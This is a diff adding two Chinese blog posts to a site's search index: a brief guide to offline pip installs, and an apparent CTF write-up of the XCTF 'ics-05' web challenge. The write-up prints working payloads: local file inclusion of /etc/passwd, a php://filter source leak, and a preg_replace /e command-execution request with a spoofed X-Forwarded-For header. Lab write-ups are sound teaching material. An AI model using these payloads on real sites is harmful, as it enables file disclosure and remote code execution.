@@ -1046,4 +1046,48 @@ st->op1->op2->e</textarea><textarea id="flowchart-2-options" style="display: non
         <tag>SSRF</tag>
       </tags>
   </entry>
+  <entry>
+    <title>python pip 离线安装第三方库</title>
+    <url>/2020/11/30/python-pip-%E7%A6%BB%E7%BA%BF%E5%AE%89%E8%A3%85%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93/</url>
+    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
+<ol>
+<li>在联网的主机上执行pip下载第三方库，如gevent、tqdm<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip2 download gevent tqdm -i https:&#x2F;&#x2F;mirrors.cloud.tencent.com&#x2F;pypi&#x2F;simple&#x2F;</span><br></pre></td></tr></table></figure></li>
+<li>复制下载的包到离线主机上，使用以下命令安装，其中pylibs是安装包保存的目录<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip2 install --no-index --find-links&#x3D;file:&#x2F;&#x2F;c:\pylibs gevent tqdm</span><br></pre></td></tr></table></figure></li>
+</ol>
+]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ics-05-writeup</title>
+    <url>/2020/12/29/ics-05-writeup/</url>
+    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本题来源于XCTF 4th-CyberEarth，攻防世界WEB进阶021上是原题，题目名称为<code>ics-05</code>，题目信息如下。<br><img data-src="/2020/12/29/ics-05-writeup/2020-12-29-14-52-41.png"></p>
+<a id="more"></a>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>打开题目链接，页面如下。<br><img data-src="/2020/12/29/ics-05-writeup/2020-12-29-15-07-00.png"><br>只有一个菜单功能可访问，也对应了题目描述“设备维护中心”的后门，所以从这开始下手，发现存在文件包含漏洞。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/index.php?page=/etc/passwd</span><br></pre></td></tr></table></figure>
+<p><img data-src="/2020/12/29/ics-05-writeup/2020-12-29-15-06-26.png"></p>
+<p>然后利用php 文件包含读取index.php源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/index.php/?page=php:<span class="comment">//filter/convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="/2020/12/29/ics-05-writeup/2020-12-29-14-56-38.png"></p>
+<p>在源码中发现后门<br><img data-src="/2020/12/29/ics-05-writeup/2020-12-29-14-58-16.png"></p>
+<p>想起以前有个php webshell就用了preg_replace执行任意代码，参考一下，成功执行命令得到flag，原理是<code>preg_replace</code>函数执行一个正则表达式的搜索和替换，<code>preg_replce</code>正则表达式部分包含e参数的时候，进行替换的部分会被执行。然后ip要’127.0.0.1’，大家一看就知道用XFF头了，不多说，我这里这么多条是因为用了插件<code>fakeIp</code>自动生成。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/index.php?pat=/[checksql]/e&amp;rep=system(<span class="string">&#x27;cat+s3chahahaDir/flag/flag.php&#x27;</span>);&amp;sub=saft</span><br></pre></td></tr></table></figure>
+<p><img data-src="/2020/12/29/ics-05-writeup/2020-12-29-15-00-06.png"></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>WEB</tag>
+        <tag>CTF</tag>
+        <tag>PHP</tag>
+        <tag>攻防世界</tag>
+        <tag>文件包含</tag>
+      </tags>
+  </entry>
 </search>
